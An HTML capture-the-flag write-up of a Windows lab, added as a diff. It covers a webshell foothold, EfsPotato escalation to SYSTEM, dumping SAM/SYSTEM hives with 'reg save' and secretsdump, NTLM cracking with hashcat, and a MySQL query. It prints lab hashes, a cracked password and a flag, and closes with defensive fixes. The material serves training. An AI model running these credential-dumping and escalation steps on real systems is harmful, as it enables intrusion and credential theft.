@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Staged (Medium): webshell, EfsPotato, MySQL flag</title>
+<style>
+  :root {
+    --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
+    --accent: #ef3257; --good: #5ddea8; --code: #1a2433; --border: #243246;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.65; font-size: 16px;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
+  h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
+  .muted { color: var(--muted); }
+  .hero {
+    background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
+    border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 2rem;
+  }
+  .pill {
+    display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
+    border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
+    padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+  table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
+  table.meta td:first-child { color: var(--muted); width: 28%; }
+  pre {
+    background: var(--code); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px; overflow-x: auto; font-size: 0.84rem; line-height: 1.5;
+  }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; color: #c9e4ff; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
+  ul { padding-left: 1.2rem; }
+  a { color: #7cb8ff; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="hero">
+  <span class="pill">HackSmarter · Windows · Medium</span>
+  <h1>Staged: webshell, EfsPotato, crack NTLM, MySQL flag</h1>
+  <p class="muted">Authorized lab only. Lab author: Tyler Ramsbey. Solved 2026-08-07.</p>
+</div>
+
+<table class="meta">
+  <tr><td>Box</td><td>Staged</td></tr>
+  <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
+  <tr><td>Type</td><td>Windows web, SeImpersonate, two hosts</td></tr>
+  <tr><td>Fault</td><td>Webshell as j.smith, EfsPotato, weak NTLM, MySQL flag store</td></tr>
+  <tr><td>Level</td><td>Medium</td></tr>
+  <tr><td>Targets</td><td>Web <code>10.1.107.112</code> · SQL <code>10.1.118.5</code></td></tr>
+  <tr><td>Result</td><td>SYSTEM on web, cracked user, flag in MySQL</td></tr>
+</table>
+
+<h2>What you need to know</h2>
+<ul>
+  <li>Windows webshells and reverse shells</li>
+  <li>SeImpersonate and potato tools (EfsPotato)</li>
+  <li>Offline NTLM crack with hashcat or john</li>
+  <li>PHP mysqli from the web host to a second SQL host</li>
+</ul>
+
+<h2>Main idea</h2>
+<p>
+Own the web worker. Rise to SYSTEM. Crack the next human account.
+Query the SQL host that holds the real flag.
+</p>
+
+<h2>Story</h2>
+<p>
+Staged uses two hosts. Take the Windows web host as <code>j.smith</code>. Escalate with EfsPotato.
+Dump and crack NTLM for <code>p.richardson</code>. From the web host, open MySQL on
+<code>sqlsrv.hacksmarter</code>. Read <code>hacksmarter_db.final_config.admin_api_token</code>.
+</p>
+
+<h2>Why it works</h2>
+<p>
+The web identity has SeImpersonate. Local dump gives NTLM that you can crack.
+SQL trusts the web path enough to expose the final secret. SYSTEM on the web host is not the end.
+</p>
+
+<pre>webshell as j.smith (SeImpersonate)
+  → Go reverse shell + EfsPotato → SYSTEM
+  → reg save SAM/SYSTEM → secretsdump
+  → crack p.richardson → ^^CThacker66
+  → PHP mysqli → 10.1.118.5
+  → hacksmarter_db.final_config → admin_api_token</pre>
+
+<h3>Step 1: Web foothold as j.smith</h3>
+<div class="why"><strong>Why:</strong> You need code run as a user with impersonation rights. Check rights at once.</div>
+<pre># get or plant webshell on web.hacksmarter (10.1.107.112)
+# move to a Go reverse shell if the shell is weak
+whoami /all
+# expect SeImpersonatePrivilege</pre>
+
+<h3>Step 2: EfsPotato to SYSTEM</h3>
+<div class="why"><strong>Why:</strong> SeImpersonate maps to SYSTEM for many service style identities.</div>
+<pre># run EfsPotato from the reverse shell
+# whoami → nt authority\system</pre>
+
+<h3>Step 3: Dump local secrets</h3>
+<div class="why"><strong>Why:</strong> Offline hives give local NTLM without more remote noise.</div>
+<pre>reg save HKLM\SAM C:\Windows\Temp\sam.save
+reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+# copy to Kali
+secretsdump.py -sam sam.save -system system.save LOCAL</pre>
+<p><strong>Lab hashes</strong></p>
+<pre>j.smith          54cea054826ad7e3ed45bad5e0b7dc42
+p.richardson     c2c67b565cbf45f1c6b47c9d20ab138b
+Administrator    eec92e27ca5d0858fbcd1ed83bac6fae
+b.morgan         663d2f33b8b2f806eadd9373fa78d8af</pre>
+
+<h3>Step 4: Crack p.richardson</h3>
+<div class="why"><strong>Why:</strong> Some paths need a clear password, not only NTLM.</div>
+<pre>hashcat -m 1000 pr.hash /usr/share/wordlists/rockyou.txt
+# or john --format=NT
+# result: p.richardson → ^^CThacker66</pre>
+
+<h3>Step 5: MySQL from web host, final flag</h3>
+<div class="why"><strong>Why:</strong> The flag is not on the web desktop. It sits on SQL as an API token row.</div>
+<pre># from web host (PHP mysqli or mysql client)
+# host: 10.1.118.5 (sqlsrv.hacksmarter)
+# database: hacksmarter_db
+# table: final_config → column admin_api_token</pre>
+<div class="flag">FLAG{b64f49553d5c441652e95697a2c5949e}</div>
+
+<h2>Impact</h2>
+<ul>
+  <li>Web code run to full SYSTEM</li>
+  <li>Password reuse into the SQL tier</li>
+  <li>API token (flag) read after one cracked user</li>
+</ul>
+
+<h2>Fix</h2>
+<ul>
+  <li>Remove SeImpersonate from web workers when possible.</li>
+  <li>Block potato style abuse. Alert on <code>reg save</code> of SAM and SYSTEM.</li>
+  <li>Use strong unique passwords. Treat dumps as cracked.</li>
+  <li>Segment SQL. Least privilege DB users. Do not store final secrets for the web identity.</li>
+  <li>Alert on rare MySQL from IIS workers if that is not normal app traffic.</li>
+</ul>
+
+<h2>Extra notes</h2>
+<ul>
+  <li>Web code run is not the end when secrets live on host two.</li>
+  <li>Path: SeImpersonate → SYSTEM → hives → NTLM → password → SQL row.</li>
+  <li>Ops: <code>~/htb/staged/ATTACK_LOG.md</code>, <code>loot/FLAG.txt</code>, hives</li>
+</ul>
+
+<h2>Close</h2>
+<p>
+Staged teaches two host thinking. Potato and dump are the middle.
+The real prize sat one hop further on SQL.
+</p>
+
+<footer>
+  <p>Authorized training only. Do not use these steps without permission.</p>
+  <p><a href="../../../">mccleod1290.github.io</a> · <a href="../../">HackSmarter labs</a></p>
+</footer>
+
+</div>
+</body>
+</html>
